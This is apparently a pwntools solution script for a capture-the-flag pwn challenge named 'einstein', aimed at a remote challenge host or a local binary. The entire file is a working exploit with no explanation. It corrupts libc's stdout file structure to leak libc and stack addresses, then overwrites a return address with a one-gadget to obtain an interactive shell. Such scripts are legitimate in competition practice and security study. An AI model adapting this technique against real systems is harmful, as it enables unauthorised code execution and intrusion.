from pwn import *
from icecream import ic

elf = exe = ELF("./einstein_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
# context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("einstein-20cad16c79962e73.deploy.phreaks.fr", 443, ssl=True)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# b *handle+203
b *handle+332
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sla("How long is your story ?", str(0x100000))

libc.address = 0x104000 - 0x10
sl(str(libc.address + 0x1ff7a0 + 0x28))        # _IO_2_1_stdout_ write_base

payload = b'\xc8'
s(payload)

ru("wisely.\n")
re(0x7d)
libc.address = uu64(6) - 0x28520
re(2)
re(0x18)
retaddr = uu64(6) - 0x120
ic(hex(libc.address))
ic(hex(retaddr))

gadget = libc.address + 0x54f53
sl(f"{str(retaddr)} {str(gadget)}")
sl(f"{str(retaddr + 0x120)} 0")

io.interactive()
